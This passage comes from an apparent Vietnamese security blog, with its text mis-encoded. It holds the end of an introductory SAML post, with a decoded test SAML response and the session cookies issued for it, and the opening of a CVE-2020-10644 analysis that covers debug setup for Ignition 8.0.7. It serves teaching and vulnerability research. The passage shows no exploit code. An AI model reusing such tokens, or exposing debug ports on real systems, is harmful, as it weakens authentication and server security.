MVWRQQ1VFQjhZc0lpVkpnNU8rbFhyb3hDUWlHdFRVUDM0UUIrbHR0Sm9zYnBYTGFXcVNZSjJjTW1GcmhWb1Y1a0VTK01qbWt4YUt3UTMxSzJGb3NlVGcwUHJnTjU2aHQ3K0VBKzlxUUtZVFRvSTZITnhKUT09PC9TaWduYXR1cmVWYWx1ZT48S2V5SW5mbz48WDUwOURhdGE%2BPFg1MDlDZXJ0aWZpY2F0ZT5NSUlERFRDQ0FmV2dBd0lCQWdJSkN6TW5LaWdSWEIvYk1BMEdDU3FHU0liM0RRRUJDd1VBTUNReElqQWdCZ05WQkFNVEdXUmxkaTA1YkhKc2RubGxjaTUxY3k1aGRYUm9NQzVqYjIwd0hoY05Nakl3TnpFeU1EYzBORFEwV2hjTk16WXdNekl3TURjME5EUTBXakFrTVNJd0lBWURWUVFERXhsa1pYWXRPV3h5YkhaNVpYSXVkWE11WVhWMGFEQXVZMjl0TUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUEzV0lEL1hKekZHTUwrTFExZjNMbW5rd2NCNWYrQWo2bjJOYm9yL3pFaVE4TDRsN0xUMXQ4M1RMV1BWd0NnbUlOQjRjODNrNGk3amY2ZHQ1QzJBbkxZUWJZcEdPeEpiS013dUc1Nk9NUy81aVZJOElDc3QxeHlzSkZlRTJveVB4YitWbk5DZEdqcFdOM0RZUzkxNldicm9pc2s1MlE2WExEdkRleXpCeEdsUDB3dFdiMnlDYWhFNDRVQjA4TGpIOWp2c0t5UGFJUzZTUjMwb1hjMndFdUZpM0krL0RGNU9UbEFRREs1MngxVW1FeHNSL21hcGRIZEhqWHNNSWhNOWxIU3Y5SWtkVmRralFEZXZmU3lLK1poRVU1d3pUVFNqMnpEZS9laFE4T2gvMlRUdlFUczJ6Umw5b1ROdHFjTnZDblZscWxWVk9OUUZxNVg1VGlWdDc3bFFJREFRQUJvMEl3UURBUEJnTlZIUk1CQWY4RUJUQURBUUgvTUIwR0ExVWREZ1FXQkJUckdmV2hjRWJHSHdXNXNOOUhwS1dEZkU2QlFEQU9CZ05WSFE4QkFmOEVCQU1DQW9Rd0RRWUpLb1pJaHZjTkFRRUxCUUFEZ2dFQkFLcGdmaFFJZU94QzVGTWlVSzdSUDJGN2p2ZlJPSlAxK1RmdnpiQXlsUC9SVzlzc0NGZXJDVDFiR2Z6YVBySjFDd3lmRTZQRlJHREVaMXFBTWRzb09iYzFHYUxCaGdlL2djTEtzYXN5U293V0ZRZ1YrT2thMWFlWWJ6OWVrajloU0M3bE5VWitKZkY0SFFuM2haL3NxYjc3WFpaeWwwWXBod1BORWN0bGZBM3I2SVJtbnZHV2V1ZFpFYllMMUI1YVNBeTBSNHI0NXFtczJGS3loM2xZRDVLa2kyRTlsMXhMZ2t2MU1OV1diYmo4RjJ0TTFNZjJKcGllY1NNbC8rQi8yQTRPcXRDclJJL2F3bWh2Zk4yNVRDL1RjSDJuQlcybHROR0ZwUFYrQTVyQnd2UzdoaTluclRmYTNjaVlYREI3c2tCSW5WaUVtWHpZZUx4cmN2bTNicVE9PC9YNTA5Q2VydGlmaWNhdGU%2BPC9YNTA5RGF0YT48L0tleUluZm8%2BPC9TaWduYXR1cmU%2BPHNhbWw6U3ViamVjdD48c2FtbDpOYW1lSUQgRm9ybWF0PSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoxLjE6bmFtZWlkLWZvcm1hdDp1bnNwZWNpZmllZCI%2BZ29vZ2xlLW9hdXRoMnwxMTcwNjkyNzEwMjAwNTg2NzQ0NDA8L3NhbWw6TmFtZUlEPjxzYW1sOlN1YmplY3RDb25maXJtYXRpb24gTWV0aG9kPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6Y206YmVhcmVyIj48c2FtbDpTdWJqZWN0Q29uZmlybWF0aW9uRGF0YSBOb3RPbk9yQWZ0ZXI9IjIwMjMtMDUtMThUMDU6MTM6NDMuOTc5WiIgUmVjaXBpZW50PSJodHRwOi8vbG9jYWxob3N0OjUwMDAvc2FtbC9jYWxsYmFjaz9vcmdfc2x1Zz1kZWZhdWx0IiBJblJlc3BvbnNlVG89ImlkLVdYQ01qRXFHOEVzZ3BkbmZsIi8%2BPC9zYW1sOlN1YmplY3RDb25maXJtYXRpb24%2BPC9zYW1sOlN1YmplY3Q%2BPHNhbWw6Q29uZGl0aW9ucyBOb3RCZWZvcmU9IjIwMjMtMDUtMThUMDQ6MTM6NDMuOTc5WiIgTm90T25PckFmdGVyPSIyMDIzLTA1LTE4VDA1OjEzOjQzLjk3OVoiPjxzYW1sOkF1ZGllbmNlUmVzdHJpY3Rpb24%2BPHNhbWw6QXVkaWVuY2U%2BaHR0cDovL2xvY2FsaG9zdDo1MDAwL3NhbWwvY2FsbGJhY2s%2Fb3JnX3NsdWc9ZGVmYXVsdDwvc2FtbDpBdWRpZW5jZT48L3NhbWw6QXVkaWVuY2VSZXN0cmljdGlvbj48L3NhbWw6Q29uZGl0aW9ucz48c2FtbDpBdXRoblN0YXRlbWVudCBBdXRobkluc3RhbnQ9IjIwMjMtMDUtMThUMDQ6MTM6NDMuOTc5WiIgU2Vzc2lvbkluZGV4PSJfcHRNNTdOWk9YVllfRk1jdkxiZTQzYm4tQmw0OFI3X3QiPjxzYW1sOkF1dGhuQ29udGV4dD48c2FtbDpBdXRobkNvbnRleHRDbGFzc1JlZj51cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YWM6Y2xhc3Nlczp1bnNwZWNpZmllZDwvc2FtbDpBdXRobkNvbnRleHRDbGFzc1JlZj48L3NhbWw6QXV0aG5Db250ZXh0Pjwvc2FtbDpBdXRoblN0YXRlbWVudD48c2FtbDpBdHRyaWJ1dGVTdGF0ZW1lbnQgeG1sbnM6eHM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hIiB4bWxuczp4c2k9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hLWluc3RhbmNlIj48c2FtbDpBdHRyaWJ1dGUgTmFtZT0iRmlyc3ROYW1lIj48c2FtbDpBdHRyaWJ1dGVWYWx1ZSB4c2k6dHlwZT0ieHM6c3RyaW5nIj50ZXN0PC9zYW1sOkF0dHJpYnV0ZVZhbHVlPjwvc2FtbDpBdHRyaWJ1dGU%2BPHNhbWw6QXR0cmlidXRlIE5hbWU9Ikxhc3ROYW1lIj48c2FtbDpBdHRyaWJ1dGVWYWx1ZSB4c2k6dHlwZT0ieHM6c3RyaW5nIj50ZXN0PC9zYW1sOkF0dHJpYnV0ZVZhbHVlPjwvc2FtbDpBdHRyaWJ1dGU%2BPHNhbWw6QXR0cmlidXRlIE5hbWU9Imh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL3VwbiI%2BPHNhbWw6QXR0cmlidXRlVmFsdWUgeHNpOnR5cGU9InhzOnN0cmluZyI%2BdGVzdEBtYWlsLmNvbTwvc2FtbDpBdHRyaWJ1dGVWYWx1ZT48L3NhbWw6QXR0cmlidXRlPjxzYW1sOkF0dHJpYnV0ZSBOYW1lPSJodHRwOi8vc2NoZW1hcy5hdXRoMC5jb20vaWRlbnRpdGllcy9kZWZhdWx0L3Byb3ZpZGVyIj48c2FtbDpBdHRyaWJ1dGVWYWx1ZSB4c2k6dHlwZT0ieHM6c3RyaW5nIj5nb29nbGUtb2F1dGgyPC9zYW1sOkF0dHJpYnV0ZVZhbHVlPjwvc2FtbDpBdHRyaWJ1dGU%2BPHNhbWw6QXR0cmlidXRlIE5hbWU9Imh0dHA6Ly9zY2hlbWFzLmF1dGgwLmNvbS9pZGVudGl0aWVzL2RlZmF1bHQvdXNlcl9pZCI%2BPHNhbWw6QXR0cmlidXRlVmFsdWUgeHNpOnR5cGU9InhzOnN0cmluZyI%2BMTE3MDY5MjExMTExMTExPC9zYW1sOkF0dHJpYnV0ZVZhbHVlPjwvc2FtbDpBdHRyaWJ1dGU%2BPHNhbWw6QXR0cmlidXRlIE5hbWU9Imh0dHA6Ly9zY2hlbWFzLmF1dGgwLmNvbS9pZGVudGl0aWVzL2RlZmF1bHQvY29ubmVjdGlvbiI%2BPHNhbWw6QXR0cmlidXRlVmFsdWUgeHNpOnR5cGU9InhzOnN0cmluZyI%2BZ29vZ2xlLW9hdXRoMjwvc2FtbDpBdHRyaWJ1dGVWYWx1ZT48L3NhbWw6QXR0cmlidXRlPjxzYW1sOkF0dHJpYnV0ZSBOYW1lPSJodHRwOi8vc2NoZW1hcy5hdXRoMC5jb20vaWRlbnRpdGllcy9kZWZhdWx0L2lzU29jaWFsIj48c2FtbDpBdHRyaWJ1dGVWYWx1ZSB4c2k6dHlwZT0ieHM6Ym9vbGVhbiI%2BdHJ1ZTwvc2FtbDpBdHRyaWJ1dGVWYWx1ZT48L3NhbWw6QXR0cmlidXRlPjwvc2FtbDpBdHRyaWJ1dGVTdGF0ZW1lbnQ%2BPC9zYW1sOkFzc2VydGlvbj48L3NhbWxwOlJlc3BvbnNlPg%3D%3D\u0026amp;RelayState=   Ch√∫ng ta c√≥ th·ªÉ decode base64 ƒëo·∫°n SAMLResponse n√†y ra, c·∫•u tr√∫c n√≥ s·∫Ω nh∆∞ sau\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79  \u0026lt;samlp:Response xmlns:samlp=\u0026#34;urn:oasis:names:tc:SAML:2.0:protocol\u0026#34; ID=\u0026#34;_1982e84d6ed4dbc53bec\u0026#34; InResponseTo=\u0026#34;id-WXCMjEqG8Esgpdnfl\u0026#34; Version=\u0026#34;2.0\u0026#34; IssueInstant=\u0026#34;2023-05-18T04:13:44.023Z\u0026#34; Destination=\u0026#34;http://localhost:5000/saml/callback?org_slug=default\u0026#34;\u0026gt; \u0026lt;saml:Issuer xmlns:saml=\u0026#34;urn:oasis:names:tc:SAML:2.0:assertion\u0026#34;\u0026gt;urn:dev-9lrlvyer.us.auth0.com\u0026lt;/saml:Issuer\u0026gt; \u0026lt;samlp:Status\u0026gt; \u0026lt;samlp:StatusCode Value=\u0026#34;urn:oasis:names:tc:SAML:2.0:status:Success\u0026#34; /\u0026gt; \u0026lt;/samlp:Status\u0026gt; \u0026lt;saml:Assertion xmlns:saml=\u0026#34;urn:oasis:names:tc:SAML:2.0:assertion\u0026#34; Version=\u0026#34;2.0\u0026#34; ID=\u0026#34;_IbB9yHmxQUFDZzNgvwzPbpTOC8xevuHo\u0026#34; IssueInstant=\u0026#34;2023-05-18T04:13:43.979Z\u0026#34;\u0026gt; \u0026lt;saml:Issuer\u0026gt;urn:dev-9lrlvyer.us.auth0.com\u0026lt;/saml:Issuer\u0026gt; \u0026lt;Signature xmlns=\u0026#34;http://www.w3.org/2000/09/xmldsig#\u0026#34;\u0026gt; \u0026lt;SignedInfo\u0026gt; \u0026lt;CanonicalizationMethod Algorithm=\u0026#34;http://www.w3.org/2001/10/xml-exc-c14n#\u0026#34; /\u0026gt; \u0026lt;SignatureMethod Algorithm=\u0026#34;http://www.w3.org/2001/04/xmldsig-more#rsa-sha256\u0026#34; /\u0026gt; \u0026lt;Reference URI=\u0026#34;#_IbB9yHmxQUFDZzNgvwzPbpTOC8xevuHo\u0026#34;\u0026gt; \u0026lt;Transforms\u0026gt; \u0026lt;Transform Algorithm=\u0026#34;http://www.w3.org/2000/09/xmldsig#enveloped-signature\u0026#34; /\u0026gt; \u0026lt;Transform Algorithm=\u0026#34;http://www.w3.org/2001/10/xml-exc-c14n#\u0026#34; /\u0026gt; \u0026lt;/Transforms\u0026gt; \u0026lt;DigestMethod Algorithm=\u0026#34;http://www.w3.org/2001/04/xmlenc#sha256\u0026#34; /\u0026gt; \u0026lt;DigestValue\u0026gt;ncVC87juff4akAL6OEjUkTFPXXXquHFs6gqtyb8pA58=\u0026lt;/DigestValue\u0026gt; \u0026lt;/Reference\u0026gt; \u0026lt;/SignedInfo\u0026gt; \u0026lt;SignatureValue\u0026gt; Q1V6m1wd0mT6/Ugz9ZxEq1uIs2QdiVIBCf1ia2ODrU7drGzWKpvvURjj57av0+tY0iNZrI4GQbs6N3yHPjlR4Mj+1k++aQ6WMoLLGX/wLfwuImrALZzXVH1MJvDcewklM39zrPRjG4S84lL737nZXM7gYuB+Sjt2V9CajfHaojHNsr9IAaPZT9saebDS7+q+0PXfdUelroOkPZPLs7//Oc4pDTP58M0fzHLUdPCUEB8YsIiVJg5O+lXroxCQiGtTUP34QB+lttJosbpXLaWqSYJ2cMmFrhVoV5kES+MjmkxaKwQ31K2FoseTg0PrgN56ht7+EA+9qQKYTToI6HNxJQ==\u0026lt;/SignatureValue\u0026gt; \u0026lt;KeyInfo\u0026gt; \u0026lt;X509Data\u0026gt; \u0026lt;X509Certificate\u0026gt; MIIDDTCCAfWgAwIBAgIJCzMnKigRXB/bMA0GCSqGSIb3DQEBCwUAMCQxIjAgBgNVBAMTGWRldi05bHJsdnllci51cy5hdXRoMC5jb20wHhcNMjIwNzEyMDc0NDQ0WhcNMzYwMzIwMDc0NDQ0WjAkMSIwIAYDVQQDExlkZXYtOWxybHZ5ZXIudXMuYXV0aDAuY29tMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3WID/XJzFGML+LQ1f3LmnkwcB5f+Aj6n2Nbor/zEiQ8L4l7LT1t83TLWPVwCgmINB4c83k4i7jf6dt5C2AnLYQbYpGOxJbKMwuG56OMS/5iVI8ICst1xysJFeE2oyPxb+VnNCdGjpWN3DYS916Wbroisk52Q6XLDvDeyzBxGlP0wtWb2yCahE44UB08LjH9jvsKyPaIS6SR30oXc2wEuFi3I+/DF5OTlAQDK52x1UmExsR/mapdHdHjXsMIhM9lHSv9IkdVdkjQDevfSyK+ZhEU5wzTTSj2zDe/ehQ8Oh/2TTvQTs2zRl9oTNtqcNvCnVlqlVVONQFq5X5TiVt77lQIDAQABo0IwQDAPBgNVHRMBAf8EBTADAQH/MB0GA1UdDgQWBBTrGfWhcEbGHwW5sN9HpKWDfE6BQDAOBgNVHQ8BAf8EBAMCAoQwDQYJKoZIhvcNAQELBQADggEBAKpgfhQIeOxC5FMiUK7RP2F7jvfROJP1+TfvzbAylP/RW9ssCFerCT1bGfzaPrJ1CwyfE6PFRGDEZ1qAMdsoObc1GaLBhge/gcLKsasySowWFQgV+Oka1aeYbz9ekj9hSC7lNUZ+JfF4HQn3hZ/sqb77XZZyl0YphwPNEctlfA3r6IRmnvGWeudZEbYL1B5aSAy0R4r45qms2FKyh3lYD5Kki2E9l1xLgkv1MNWWbbj8F2tM1Mf2JpiecSMl/+B/2A4OqtCrRI/awmhvfN25TC/TcH2nBW2ltNGFpPV+A5rBwvS7hi9nrTfa3ciYXDB7skBInViEmXzYeLxrcvm3bqQ=\u0026lt;/X509Certificate\u0026gt; \u0026lt;/X509Data\u0026gt; \u0026lt;/KeyInfo\u0026gt; \u0026lt;/Signature\u0026gt; \u0026lt;saml:Subject\u0026gt; \u0026lt;saml:NameID Format=\u0026#34;urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified\u0026#34;\u0026gt; google-oauth2|117069271020058674440\u0026lt;/saml:NameID\u0026gt; \u0026lt;saml:SubjectConfirmation Method=\u0026#34;urn:oasis:names:tc:SAML:2.0:cm:bearer\u0026#34;\u0026gt; \u0026lt;saml:SubjectConfirmationData NotOnOrAfter=\u0026#34;2023-05-18T05:13:43.979Z\u0026#34; Recipient=\u0026#34;http://localhost:5000/saml/callback?org_slug=default\u0026#34; InResponseTo=\u0026#34;id-WXCMjEqG8Esgpdnfl\u0026#34; /\u0026gt; \u0026lt;/saml:SubjectConfirmation\u0026gt; \u0026lt;/saml:Subject\u0026gt; \u0026lt;saml:Conditions NotBefore=\u0026#34;2023-05-18T04:13:43.979Z\u0026#34; NotOnOrAfter=\u0026#34;2023-05-18T05:13:43.979Z\u0026#34;\u0026gt; \u0026lt;saml:AudienceRestriction\u0026gt; \u0026lt;saml:Audience\u0026gt;http://localhost:5000/saml/callback?org_slug=default\u0026lt;/saml:Audience\u0026gt; \u0026lt;/saml:AudienceRestriction\u0026gt; \u0026lt;/saml:Conditions\u0026gt; \u0026lt;saml:AuthnStatement AuthnInstant=\u0026#34;2023-05-18T04:13:43.979Z\u0026#34; SessionIndex=\u0026#34;_ptM57NZOXVY_FMcvLbe43bn-Bl48R7_t\u0026#34;\u0026gt; \u0026lt;saml:AuthnContext\u0026gt; \u0026lt;saml:AuthnContextClassRef\u0026gt;urn:oasis:names:tc:SAML:2.0:ac:classes:unspecified\u0026lt;/saml:AuthnContextClassRef\u0026gt; \u0026lt;/saml:AuthnContext\u0026gt; \u0026lt;/saml:AuthnStatement\u0026gt; \u0026lt;saml:AttributeStatement xmlns:xs=\u0026#34;http://www.w3.org/2001/XMLSchema\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34;\u0026gt; \u0026lt;saml:Attribute Name=\u0026#34;FirstName\u0026#34;\u0026gt; \u0026lt;saml:AttributeValue xsi:type=\u0026#34;xs:string\u0026#34;\u0026gt;test\u0026lt;/saml:AttributeValue\u0026gt; \u0026lt;/saml:Attribute\u0026gt; \u0026lt;saml:Attribute Name=\u0026#34;LastName\u0026#34;\u0026gt; \u0026lt;saml:AttributeValue xsi:type=\u0026#34;xs:string\u0026#34;\u0026gt;test\u0026lt;/saml:AttributeValue\u0026gt; \u0026lt;/saml:Attribute\u0026gt; \u0026lt;saml:Attribute Name=\u0026#34;http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn\u0026#34;\u0026gt; \u0026lt;saml:AttributeValue xsi:type=\u0026#34;xs:string\u0026#34;\u0026gt;test@mail.com\u0026lt;/saml:AttributeValue\u0026gt; \u0026lt;/saml:Attribute\u0026gt; \u0026lt;saml:Attribute Name=\u0026#34;http://schemas.auth0.com/identities/default/provider\u0026#34;\u0026gt; \u0026lt;saml:AttributeValue xsi:type=\u0026#34;xs:string\u0026#34;\u0026gt;google-oauth2\u0026lt;/saml:AttributeValue\u0026gt; \u0026lt;/saml:Attribute\u0026gt; \u0026lt;saml:Attribute Name=\u0026#34;http://schemas.auth0.com/identities/default/user_id\u0026#34;\u0026gt; \u0026lt;saml:AttributeValue xsi:type=\u0026#34;xs:string\u0026#34;\u0026gt;117069211111111\u0026lt;/saml:AttributeValue\u0026gt; \u0026lt;/saml:Attribute\u0026gt; \u0026lt;saml:Attribute Name=\u0026#34;http://schemas.auth0.com/identities/default/connection\u0026#34;\u0026gt; \u0026lt;saml:AttributeValue xsi:type=\u0026#34;xs:string\u0026#34;\u0026gt;google-oauth2\u0026lt;/saml:AttributeValue\u0026gt; \u0026lt;/saml:Attribute\u0026gt; \u0026lt;saml:Attribute Name=\u0026#34;http://schemas.auth0.com/identities/default/isSocial\u0026#34;\u0026gt; \u0026lt;saml:AttributeValue xsi:type=\u0026#34;xs:boolean\u0026#34;\u0026gt;true\u0026lt;/saml:AttributeValue\u0026gt; \u0026lt;/saml:Attribute\u0026gt; \u0026lt;/saml:AttributeStatement\u0026gt; \u0026lt;/saml:Assertion\u0026gt; \u0026lt;/samlp:Response\u0026gt;   R·∫•t l√† nhi·ªÅu th·∫ª v√† th√¥ng tin, h√£y xem √Ω nghƒ©a c·ªßa t·ª´ng th·∫ª v√† thu·ªôc t√≠nh\nID=\u0026quot;_1982e84d6ed4dbc53bec\u0026quot;: ID c·ªßa SAML Response. M·ªói SAML Response duy nh·∫•t s·∫Ω c√≥ m·ªôt ID ri√™ng ƒë·ªÉ ph√¢n bi·ªát n√≥ v·ªõi c√°c Response kh√°c.\nInResponseTo=\u0026quot;id-WXCMjEqG8Esgpdnfl\u0026quot;: ID c·ªßa y√™u c·∫ßu x√°c th·ª±c ban ƒë·∫ßu. Response n√†y ƒëang tr·∫£ l·ªùi y√™u c·∫ßu x√°c th·ª±c c√≥ ID l√† \u0026quot;id-WXCMjEqG8Esgpdnfl\u0026quot;.\nVersion=\u0026quot;2.0\u0026quot;: Phi√™n b·∫£n c·ªßa giao th·ª©c SAML ƒë∆∞·ª£c s·ª≠ d·ª•ng.\nIssueInstant=\u0026quot;2023-05-18T04:13:44.023Z\u0026quot;: Th·ªùi ƒëi·ªÉm SAML Response ƒë∆∞·ª£c ph√°t h√†nh.\nDestination=\u0026quot;http://localhost:5000/saml/callback?org_slug=default\u0026quot;: ƒê√≠ch c·ªßa SAML Response, n∆°i n√≥ ƒë∆∞·ª£c g·ª≠i ƒë·∫øn.\n\u0026lt;saml:Issuer\u0026gt;: ƒê·ªãnh danh c·ªßa nh√† cung c·∫•p d·ªãch v·ª• x√°c th·ª±c (IdP) - t·ª©c l√† Auth0 trong tr∆∞·ªùng h·ª£p n√†y.\n\u0026lt;samlp:Status\u0026gt;: Tr·∫°ng th√°i c·ªßa SAML Response, cho bi·∫øt x√°c th·ª±c th√†nh c√¥ng hay kh√¥ng. Tr·∫°ng th√°i n√†y ch·ª©a m·ªôt ph·∫ßn t·ª≠ \u0026lt;samlp:StatusCode\u0026gt; v·ªõi gi√° tr·ªã \u0026quot;urn:oasis:names:tc:SAML:2.0:status:Success\u0026quot; ƒë·ªÉ ch·ªâ r·∫±ng x√°c th·ª±c th√†nh c√¥ng.\n\u0026lt;saml:Assertion\u0026gt;: Kh·∫≥ng ƒë·ªãnh ch·ª©a th√¥ng tin chi ti·∫øt v·ªÅ x√°c th·ª±c.\n\u0026lt;Signature\u0026gt;: Ch·ª©ng th·ª±c k√Ω s·ªë c·ªßa SAML Response, ƒë·∫£m b·∫£o t√≠nh to√†n v·∫πn v√† x√°c th·ª±c c·ªßa n√≥.\n\u0026lt;saml:Subject\u0026gt;: M√¥ t·∫£ ƒë·ªëi t∆∞·ª£ng m√† x√°c th·ª±c √°p d·ª•ng cho.\n\u0026lt;saml:Conditions\u0026gt;: C√°c ƒëi·ªÅu ki·ªán v√† h·∫°n ch·∫ø √°p d·ª•ng cho x√°c th·ª±c, v√≠ d·ª• nh∆∞ th·ªùi gian ƒë∆∞·ª£c ph√©p s·ª≠ d·ª•ng, nh∆∞ v√≠ d·ª• ·ªü ƒë√¢y l√† v√†o 1 ti·∫øng, t·ª´ 2023-05-18T04:13:43.979Z ƒë·∫øn 2023-05-18T05:13:43.979Z.\n\u0026lt;saml:AuthnStatement\u0026gt;: Tuy√™n b·ªë v·ªÅ qu√° tr√¨nh x√°c th·ª±c.\n\u0026lt;saml:AttributeStatement\u0026gt;: Tuy√™n b·ªë v·ªÅ c√°c thu·ªôc t√≠nh c·ªßa ƒë·ªëi t∆∞·ª£ng x√°c th·ª±c.\nNgo√†i ra, c√≥ nhi·ªÅu ph·∫ßn t·ª≠ \u0026lt;saml:Attribute\u0026gt; trong \u0026lt;saml:AttributeStatement\u0026gt; ƒë·ªÉ m√¥ t·∫£ c√°c thu·ªôc t√≠nh c·ªßa ƒë·ªëi t∆∞·ª£ng x√°c th·ª±c, ch·∫≥ng h·∫°n nh∆∞ FirstName, LastName, Email, v√† c√°c thu·ªôc t√≠nh t·ª´ Identity Provider (·ªü ƒë√¢y l√† Auth0).\nSau khi g·ª≠i SAMLResponse cho Service Provider, Service Provider s·∫Ω th·ª±c hi·ªán validate SAML response. N·∫øu th√†nh c√¥ng, Service Provider s·∫Ω cho ph√©p ng∆∞·ªùi d√πng truy c·∫≠p v√†o source m√† ng∆∞·ªùi d√πng ƒë√£ th·ª±c hi·ªán request tr∆∞·ªõc ƒë√≥ (·ªü ƒë√¢y l√† cung c·∫•p session h·ª£p l·ªá).\n1 2 3 4 5 6 7 8 9 10 11 12  HTTP/1.0 302 FOUND Content-Type: text/html; charset=utf-8 Content-Length: 209 Location: http://localhost:5000/ Set-Cookie: remember_token=3-d4e21fdbb3a3c708808e397654825310|11cbe4fdf2454251c7af78125c61747354921f9e28901819a7f411822593e68a2f6523d71575a9805acfb6c065c739be5c718624bbc43e45fb9844468a2c1261; Expires=Sun, 18-Jun-2023 04:13:44 GMT; HttpOnly; Path=/ Set-Cookie: session=.eJw1z8tKBDEQheF3yVqhkrqkMi8zJHVBEVvp7lmJ724Luj_8fOer3HOP46Xczv0RT-X-6uVW0EkTOBIdFBdCGzy6StVpzqzNe7fs4TlXEyAJNs6-1kgkqSgEhtR4BoyOHakyGI8hXtdgs4mROalNUqqmJDDUs3ZdIHUYlwvyGfv73GI7_2l27Hk_P95iu4TTI5R4DgE1wJ6tIl8AbBPIl0hSXR6_pccR-9-tZ6doNf3aTbQOqqCBowuTNsYK5fsHjlJNAA.ZGWl-A.RUAq6b39hHkpiBfG-jt-RcNRzM0; Expires=Thu, 18-May-2023 10:13:44 GMT; HttpOnly; Path=/ .... \u0026lt;!DOCTYPE HTML PUBLIC \u0026#34;-//W3C//DTD HTML 3.2 Final//EN\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Redirecting...\u0026lt;/title\u0026gt; \u0026lt;h1\u0026gt;Redirecting...\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;You should be redirected automatically to target URL: \u0026lt;a href=\u0026#34;/\u0026#34;\u0026gt;/\u0026lt;/a\u0026gt;. If not click the link.   OK v·∫≠y l√† xong ph·∫ßn gi·ªõi thi·ªáu v·ªÅ SAML v√† c√°ch th·ª©c ho·∫°t ƒë·ªông c·ªßa SAML. Ph·∫ßn ti·∫øp theo s·∫Ω l√† ph·∫ßn t·∫≠p trung v√†o vi·ªác khai th√°c c√°c l·ªó h·ªïng li√™n quan ƒë·∫øn SAML. C√°c b·∫°n ch·ªù ƒë·∫øn ph·∫ßn ti·∫øp theo nh√© :see_no_evil:\nTham kh·∫£o  https://learn.microsoft.com/en-us/azure/active-directory/fundamentals/auth-saml https://techmaster.vn/posts/34473/authentication-va-authorization-openid-vs-oauth2-vs-saml https://www.techtarget.com/searchsecurity/definition/SAML  ","permalink":"https://minhtuanact.ml/posts/saml-hacking-phan-1-gioi-thieu-ve-saml/","summary":"ƒê√¢y l√† b√†i m·ªü ƒë·∫ßu c·ªßa series SAML Hacking m√† m√¨nh t√¨m hi·ªÉu ƒë∆∞·ª£c trong th·ªùi gian v·ª´a qua, b√†i ƒë·∫ßu ti√™n s·∫Ω gi·ªõi thi·ªáu v·ªÅ SAML v√† c√°ch th·ª©c ho·∫°t ƒë·ªông c·ªßa n√≥.\nSAML l√† g√¨? SAML (Security Assertion Markup Language) l√† m·ªôt chu·∫©n giao th·ª©c ƒë∆∞·ª£c s·ª≠ d·ª•ng r·ªông r√£i trong vi·ªác truy·ªÅn t·∫£i th√¥ng tin x√°c th·ª±c v√† ph√¢n quy·ªÅn gi·ªØa c√°c h·ªá th·ªëng kh√°c nhau. ƒê∆∞·ª£c √°p d·ª•ng ch·ªß y·∫øu trong c√°c ·ª©ng d·ª•ng web, SAML cho ph√©p x√°c th·ª±c ng∆∞·ªùi d√πng v√† ƒë·ªëi t√°c b·∫±ng c√°ch s·ª≠ d·ª•ng ch·ª©ng ch·ªâ s·ªë v√† c√°c th√¥ng tin kh√°c ƒë·ªÉ x√°c nh·∫≠n danh t√≠nh.","title":"SAML Hacking (ph·∫ßn 1) - Gi·ªõi thi·ªáu v·ªÅ SAML"},{"content":"V√†o m·ªôt bu·ªïi chi·ªÅu, em teammate @lengocanh c√≥ r·ªß m√¨nh ph√¢n t√≠ch m·ªôt v√†i CVE c·ªßa Inductive Automation Ignition. ·ªû ƒë√¢y m√¨nh ch·ªçn m·ªôt CVE ph√¢n t√≠ch kh√° ƒë∆°n gi·∫£n l√† CVE-2020-10644 ƒë·ªÉ kh·ªüi ƒë·∫ßu chu·ªói series ph√¢n t√≠ch c√°c l·ªó h·ªïng c·ªßa Inductive Automation Ignition. ƒê√¢y l√† l·ªó h·ªïng ƒë∆∞·ª£c team Flashback t√¨m ra v√† ƒëem tham d·ª± Pwn2Own Miami 2020 v√†o th√°ng 1/2020. L·ªó h·ªïng n√†y cho ph√©p attacker c√≥ th·ªÉ RCE unauthen ƒë·∫øn server ƒëang ch·∫°y Inductive Automation Ignition t·ª´ phi√™n b·∫£n 8.0.0 ƒë·∫øn 8.0.7.\nSetup debug Vi·ªác setup di·ªÖn ra r·∫•t ƒë∆°n gi·∫£n, ch·ªâ c·∫ßn c√†i ƒë·∫∑t phi√™n b·∫£n c√≥ l·ªó h·ªïng (·ªü ƒë√¢y m√¨nh ch·ªçn phi√™n b·∫£n 8.0.7) ƒë·ªÉ setup debug th√¥i. https://inductiveautomation.com/downloads/archive/8.0.7\nM√¨nh s·ª≠ d·ª•ng Windows ƒë·ªÉ setup n√™n download b·ªô c√†i n√†y r·ªìi c√†i v√†o th√¥i\nhttps://files.inductiveautomation.com/release/ia/build8.0.7/20191220-1439/Ignition-8.0.7-windows-x64-installer.exe\n·ªû ƒë√¢y ch∆∞∆°ng tr√¨nh s·ª≠ d·ª•ng wrapper deploy n√™n debug kh√° d·ªÖ d√†ng, ch√∫ng ta ch·ªâ c·∫ßn ch·ªânh s·ª≠a m·ªôt ch√∫t ·ªü file ignition.conf trong C:\\Program Files\\Inductive Automation\\Ignition\\data l√† ƒë∆∞·ª£c\nB·ªè commend d√≤ng n√†y l√† oke. Debug port t·∫°i 8000\n1  wrapper.java.additional.3=-Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=*:8000   Sau ƒë√≥ ch·ªâ c·∫ßn stop r·ªìi start l·∫°i Ignition l√† xong\nK√©o to√†n b·ªô file .jar ra ngo√†i r·ªìi import v√†o trong Intellij ƒë·ªÉ 